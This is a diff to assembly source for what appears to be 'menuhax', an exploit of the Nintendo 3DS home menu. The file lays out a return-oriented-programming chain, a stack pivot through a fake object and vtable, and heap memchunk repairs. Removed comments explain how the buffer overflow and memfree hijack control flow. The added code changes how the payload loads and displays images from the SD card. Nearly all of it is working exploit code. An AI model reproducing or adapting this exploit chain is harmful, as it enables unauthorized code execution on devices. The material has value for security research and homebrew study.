@@ -2,51 +2,24 @@
 .section .init
 .global _start
 
-/*
-All function addresses referenced here are for v9.4 homemenu.
-
-The CTRSDK memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
-After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
-L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
-L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
-L_2441a0: L_1e95e0(*(inr0+4)); ...
-L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
-*/
-
 //The addresses for the ROP-chain is from an include, see the Makefile gcc line with -include / README.
 
 #include "menuhax_ropinclude.s"
 
 _start:
-
-themeheader:
-#ifndef BUILDROPBIN
-#ifndef THEMEDATA_PATH
-@ This is the start of the decompressed theme data.
-.word 1 @ version
-#else
-.incbin THEMEDATA_PATH
-#endif
-#else
-
-#ifdef PAYLOAD_HEADERFILE
-.incbin PAYLOAD_HEADERFILE
-#endif
+.word POP_R0PC
+ret2menu_exploitreturn_spaddr: @ The menuhax_loader writes the sp-addr to jump to for ret2menu here. This value isn't actually used currently.
+.word 0
 
 .word POP_R0PC @ Stack-pivot to ropstackstart.
 .word HEAPBUF + (object - _start) @ r0
 
 .word ROP_LOADR4_FROMOBJR0
-#endif
-
-#ifndef THEMEDATA_PATH
-.space ((themeheader + 0xc4) - .)
-#endif
 
 object:
 .word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
-.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
-.word 0 @ Memchunk-hdr stuff writes here.
+.word 0
+.word 0
 .word 0
 
 .word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
@@ -57,21 +30,11 @@ stackpivot_sploadword:
 stackpivot_pcloadword:
 .word ROP_POPPC @ pc
 
-.space ((object + 0x28) - .)
-.word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
-
-@ Fill memory with the ptrs used by the following:
-@ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.
-@ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
-.fill (((object + 0x3a60 + 0x100) - .) / 4), 4, (HEAPBUF + (object - _start))
-
 vtable:
 .word 0, 0 @ vtable+0
-.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
+.word 0
 .word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
-.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20
-
-.space ((object + 0x4000) - .) @ Base the tmpdata followed by stack, at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).
+.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +16
 
 tmpdata:
 
@@ -102,10 +65,6 @@ gamecard_titleinfo:
 .word 0 @ reserved
 
 #ifdef LOADSDPAYLOAD
-sd_archivename:
-.string "sd:"
-.align 2
-
 IFile_ctx:
 .space 0x20
 
@@ -191,10 +150,6 @@ tmp_scratchdata:
 .space 0x400
 
 ropstackstart:
-#ifdef LOADSDPAYLOAD
-CALLFUNC_NOSP FS_MountSdmc, (HEAPBUF + (sd_archivename - _start)), 0, 0, 0
-#endif
-
 #ifdef USE_PADCHECK
 PREPARE_RET2MENUCODE
 
@@ -255,7 +210,7 @@ ROPMACRO_WRITEWORD (FIXHEAPBUF+0x2a0000 + 0x8), 0x0
 ROPMACRO_WRITEWORD (FIXHEAPBUF+0x2a0000 + 0xc), 0x0
 
 @ Write the below value to a heapctx state ptr, which would've been the addr value located there if the memchunk wasn't overwritten, after the memfree was done.
-ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80+0x40002c + 0x3c + 0x4), (HEAPBUF-0x58)
+ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80+0x40002c + 0x3c + 0x4), (FIXHEAPBUF-0x58)
 
 @ Write the below value to a freemem memchunk header ptr, which would've been the addr value located there if the memchunk wasn't overwritten(the one targeted in the buf overflow), after the memfree  was done.
 #if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
@@ -550,12 +505,16 @@ padcheck_finish_jump:
 CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
 #else
 
+@ Allocate the buffer containing the gfx data in linearmem, with the bufptr located @ tmp_scratchdata+4, which is then copied to tmp_scratchdata+8.
+CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata+4 - _start)), 0, 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x10003, 0x3, 0, 0
+ROPMACRO_COPYWORD (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+4 - _start))
+
 @ Initialize the data which will be copied into the framebuffers, for when reading the file fails.
 
-CALLFUNC_NOSP MEMCPY, (HEAPBUF + (_end - _start)), 0x1f000000, (0x46800*2), 0
+@ Clear the entire buffer, including the sub-screen data just to make sure it's all-zero initially.
+CALLFUNC_NOSP_LDRR0 MEMSET32_OTHER, (HEAPBUF + (tmp_scratchdata+8 - _start)), ((0x46800*2) + 0x38800), 0, 0
 
-@ Normally the sub-screen data here will be zeros, but do this anyway just in case.
-CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (_end - _start + 0x46800*2)), 0x38800, 0, 0
+CALLFUNC_NOSP_LDRR0 MEMCPY, (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f000000, (0x46800*2), 0
 
 #ifdef ENABLE_IMAGEDISPLAY_SD
 CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
@@ -563,13 +522,15 @@ CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
 CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_imagedisplay_path - _start)), 1, 0
 
 @ Read main-screen 3D-left image.
-CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (_end - _start)), (0x46500)
+CALLFUNC_NOSP_LOADR2 IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), (0x46500)
 
 @ Read main-screen 3D-right image.
-CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (_end - _start + 0x46800)), (0x46500)
+ROPMACRO_LDDRR0_ADDR1_STRADDR (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x46800
+CALLFUNC_NOSP_LOADR2 IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), (0x46500)
 
 @ Read sub-screen image.
-CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (_end - _start + 0x46800*2)), (0x38400)
+ROPMACRO_LDDRR0_ADDR1_STRADDR (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x46800
+CALLFUNC_NOSP_LOADR2 IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), (0x38400)
 
 ROP_SETLR ROP_POPPC
 
@@ -592,16 +553,27 @@ CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 1, 0, 0x1f48f000, 0, 0x2d0, 0x301, 0, 0
 @ Setup secondary framebuffers for the sub-screen.
 CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 1, 1, 0x1f48f000 + 0x38800, 0, 0x2d0, 0x301, 1, 0
 
+
 @ Flush gfx dcache.
-CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (_end - _start)), (0x46800*2) + 0x38800, 0, 0
+CALLFUNC_NOSP_LDRR0 GSPGPU_FlushDataCache, (HEAPBUF + (tmp_scratchdata+4 - _start)), (0x46800*2) + 0x38800, 0, 0
+
+ROPMACRO_COPYWORD (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+4 - _start))
 
 @ Copy the gfx to the primary/secondary main-screen framebuffers.
-CALL_GXCMD4 (HEAPBUF + (_end - _start)), 0x1f1e6000, 0x46800*2
-CALL_GXCMD4 (HEAPBUF + (_end - _start)), 0x1f273000, 0x46800*2
+CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f1e6000, 0x46800*2
+CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f273000, 0x46800*2
 
 @ Copy the gfx to the primary/secondary sub-screen framebuffers.
-CALL_GXCMD4 (HEAPBUF + (_end - _start)) + (0x46800*2), 0x1f48f000, 0x38800
-CALL_GXCMD4 (HEAPBUF + (_end - _start)) + (0x46800*2), 0x1f48f000 + 0x38800, 0x38800
+ROPMACRO_LDDRR0_ADDR1_STRADDR (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x46800*2
+
+CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f48f000, 0x38800
+CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f48f000 + 0x38800, 0x38800
+
+@ Wait 0.1s for the above transfers to finish, then free the allocated linearmem buffer.
+
+CALLFUNC_NOSP svcSleepThread, 100000000, 0, 0, 0
+
+CALLFUNC_LDRR1 svcControlMemory, (HEAPBUF + (tmp_scratchdata+12 - _start)), (HEAPBUF + (tmp_scratchdata+4 - _start)), 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x1, 0x0, 0, 0
 #endif
 
 #ifdef ENABLE_RET2MENU
@@ -1100,12 +1072,4 @@ codedataend:
 
 .align 4
 _end:
-
-#ifdef PAYLOAD_PADFILESIZE
-.space (0x150000 - (_end - _start))
-#endif
-
-#ifdef PAYLOAD_FOOTER_WORDS
-.word PAYLOAD_FOOTER_WORD0, PAYLOAD_FOOTER_WORD1, PAYLOAD_FOOTER_WORD2, PAYLOAD_FOOTER_WORD3
-#endif
 
